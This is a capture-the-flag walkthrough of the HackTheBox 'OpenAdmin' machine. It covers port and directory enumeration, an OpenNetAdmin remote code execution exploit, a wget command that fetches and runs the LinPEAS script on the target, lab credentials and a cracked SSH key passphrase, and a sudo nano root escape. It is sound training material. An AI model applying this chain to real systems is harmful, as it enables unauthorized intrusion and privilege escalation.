Ready for a new machine? Let's start with open ports enumeration:

![nmap](/blog/hackthebox-ctf-openadmin/nmap.png)

As a result, we can see that there is a Apache webserver on port 80:

![apache](/blog/hackthebox-ctf-openadmin/apache.png)

Let's run **dirbuster** against the webserver to see if we can find some interesting directory:

![dirbuster](/blog/hackthebox-ctf-openadmin/dirbuster.png)

So we can see that there is a **/ona/** and **/ona/login.php** directories that seems interesting:

![ona](/blog/hackthebox-ctf-openadmin/ona.png)

![ona login webpage](/blog/hackthebox-ctf-openadmin/ona-login.png)

**OpenNetAdmin** is a Network Management application working with a centralized AJAX web interface.
So this application is installed on the webserver, and the version installed is not the latest one, it's the **version 18.1.1**.

By searching a exploit for this version on google we can find a **Remote Code Execution** exploit really quickly here:
https://www.exploit-db.com/exploits/47691.

![exploit](/blog/hackthebox-ctf-openadmin/exploit.png)

We can now execute some commands on the system, but it's very limited.
We have to find a way to gain access to a not restricted shell.

Let's use **LinPEAS**, it's a really useful script that searh for possible paths to escalate privileges on Linux,
the script is available here: https://github.com/peass-ng/PEASS-ng.

To download the script on the system we just have to execute this command:

```shell
wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
```

And then, this command to execute it and store the results in a text file:

```shell
./linpeas.sh -a > linpeas_result.txt
```

After searching in the linpeas_result.txt file we can see that there is an interesting file who contain this line:
**'db_passwd' => 'n1nj4W4rri0R!'**.

![first password](/blog/hackthebox-ctf-openadmin/first-password.png)

Let's open this file to see exactly what it contain: **/var/www/ona/local/config/database_settings.inc.php**.
It seems that we find database credential for the **ona_sys** user.

![db creds](/blog/hackthebox-ctf-openadmin/db-creds.png)

But after trying to connect to mysql with 10.10.10.171 host, it seems like it's not possible to connect to mysql.
So maybe this password is used for something else... Let's see the users on the system:

![users](/blog/hackthebox-ctf-openadmin/user.png)

Ok so there is two users on the system, we can try to use the password we find on the user jimmy:

![jimmy](/blog/hackthebox-ctf-openadmin/jimmy.png)

Bingo, we finally have a SSH shell with the user jimmy! But what we want is to have access to a shell with root privilege.

Once again, let's use **LinPEAS** to see what we can find:

![hash](/blog/hackthebox-ctf-openadmin/hash.png)

It seems that LinPEAS found an interesting hash in the file **/var/www/internal/index.php**, let's open it:

![hash 2](/blog/hackthebox-ctf-openadmin/hash2.png)

This look like a connection page, the username and the **sha512** hash are hardcoded,
and once the is established there is a redirection to the main.php page.

![main](/blog/hackthebox-ctf-openadmin/main.png)

The main.php page seems to execute a cat on the **/home/joanna/.ssh/id_rsa** file,
so it give the private SSH key of the joanna user. Now the challenge is to access this connection page index.php.

So now that we have a hash let's crack it, for this hash we can directly crack it on https://crackstation.net/:

![crack hash](/blog/hackthebox-ctf-openadmin/crack-hash.png)

Let's list all the open ports on the system:

![netstat](/blog/hackthebox-ctf-openadmin/netstat.png)

The port 52846 is open on localhost. We can do a curl on it to see what it is.

![curl](/blog/hackthebox-ctf-openadmin/curl.png)

This is the index.php connection page that we just found earlier in the internal directory.
So we just have to do a curl on the main.php page to get the SSH key.

![ssh key](/blog/hackthebox-ctf-openadmin/ssh-key.png)

It's working, we now have the joanna's SSH privaye key. With this key we can have a SSH shell with user joanna.
Let's transfer this key on our computer with **scp** command, and let's crack it with **john**.

![ssh2john](/blog/hackthebox-ctf-openadmin/ssh2john.png)

![john crack](/blog/hackthebox-ctf-openadmin/john-crack.png)

John find that the passphrase of the key is: **bloodninjas**. So let's try to connect to ssh with user joanna using this key.
First, we need to change the .ssh config file to match with this new key,
and we have to change the SSH key file permission to **600**.

![ssh config](/blog/hackthebox-ctf-openadmin/ssh-config.png)

Then we can connect:

![joanna](/blog/hackthebox-ctf-openadmin/joanna.png)

Now we have to gain access to a shell with root privilege.
Let's find which commands current user is allowed with sudo, using the **sudo -l** command:

![sudo -l command result](/blog/hackthebox-ctf-openadmin/sudo-l.png)

Joanna is allowed to run nano on the file **/opt/priv** with sudo and without password needed.
Here we can find an exploit using nano and sudo: https://gtfobins.github.io/gtfobins/nano/.

![nano exploit](/blog/hackthebox-ctf-openadmin/nano-exploit.png)

Bingo! Machine rooted!

![root](/blog/hackthebox-ctf-openadmin/root.png)
